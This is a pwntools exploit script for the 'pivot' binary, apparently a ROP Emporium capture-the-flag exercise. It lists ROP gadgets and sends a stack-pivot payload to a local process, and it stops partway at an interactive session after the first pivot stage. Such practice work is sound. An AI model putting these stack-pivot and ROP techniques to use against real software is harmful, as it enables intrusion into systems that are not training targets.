#!/usr/bin/env python3
# coding: utf-8
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot')

# Open GDB in a new tmux pane
context.terminal = ["tmux", "splitw", "-h"]

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
tbreak *pwnme+182
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()


# Pass the text output of the binary
for _ in range(0, 4):
    io.readline()

# Extract the address of the Stack Pivot
line = io.readline()
print(f"Line received: {line}")
stack_pivot = int(line.split(b' ')[11], 16)
print(f"Stack Pivot address: {hex(stack_pivot)}")


"""
Gadgets

> ropper -f pivot
0x4009be: xchg esp, eax; ret; // stack pivot
0x4009bd: xchg rsp, rax; ret; // stack pivot

0x4006b6: ret;
0x4009bb: pop rax; ret;
0x400a33: pop rdi; ret;
0x400a31: pop rsi; pop r15; ret;

"""

ret = 0x4006b6
pop_eax = 0x4009bb
pop_rdi = 0x400a33
pop_rsi_r15 = 0x400a31

# stack pivot gadget
xch_rsp_rax = 0x4009bd

got_foothold = 0x601040
plt_foothold = 0x400726

###########################################
# Part 1: Leak the Address of libpivot.so #
###########################################

# Stack Pivot

pivot = fit({
    0x00: stack_pivot + 0x20,
    0x20: p64(plt_foothold) + p64(pop_eax) + p64(got_foothold),
}, length=128)
io.sendline(pivot)


# Smash the Stack with a stack pivot
smash = fit({
    0x28: pop_eax,
    0x30: stack_pivot,
    0x38: xch_rsp_rax,
},length=0x40)
io.send(smash)

io.interactive()
